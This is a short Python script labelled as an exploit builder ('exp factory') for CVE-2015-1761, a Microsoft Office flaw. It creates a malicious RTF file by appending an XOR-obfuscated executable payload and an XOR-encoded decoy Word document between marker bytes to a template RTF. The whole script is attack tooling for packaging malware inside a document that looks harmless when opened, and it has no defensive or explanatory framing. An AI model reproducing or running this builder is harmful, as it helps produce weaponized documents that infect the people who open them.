#CVE-2015-1761 exp factory

import os
import sys
import re
import struct

def main(argv):

	if len(argv) != 2:
		return

	file_new = open("new.rtf","rb")
	file_template = file_new.read()
	file_exploit = open(r"exp.rtf",'wb')
	'''add markets'''
	file_exploit.write(file_template)
	file_exploit.write('\xBA\xBA\xBA\xBA\xBA\xBA')	

	'''for EXE'''
	exe_path = argv[0]
	    
	file_exe = open(exe_path,'rb')
	while True:
	    exe_data = file_exe.read(4)
	    if not exe_data:
	        break
	    Exe_data = struct.unpack('I',exe_data)
	    Decode_exe_data = Exe_data[0] ^ 0xCAFEBABE
	    file_exploit.write(struct.pack('I',Decode_exe_data))	

	file_exe.close()	

	    	

	'''add markets'''
	file_exploit.write('\xBB\xBB\xBB\xBB\xBB\xBB')	
	
	

	'''for DOC'''
	normal_doc_path = argv[1]

	#file_norDoc = open(mormal_doc_path,'rb').read()	

	file_norDoc = open(normal_doc_path,'rb')
	while True:
	    doc_data = file_norDoc.read(4)
	    if not doc_data:
	        break
	    Doc_data = struct.unpack('I',doc_data)
	    Decode_doc_data = Doc_data[0] ^ 0xBAADF00D
	    file_exploit.write(struct.pack('I',Decode_doc_data))	

	'''add markets'''
	file_exploit.write('\xBC\xBC\xBC\xBC\xBC\xBC')	

	file_exploit.write('\x41' * 100)	
	

	file_norDoc.close()
	file_exploit.close()
	    
if __name__ == '__main__':
	main(sys.argv[1:])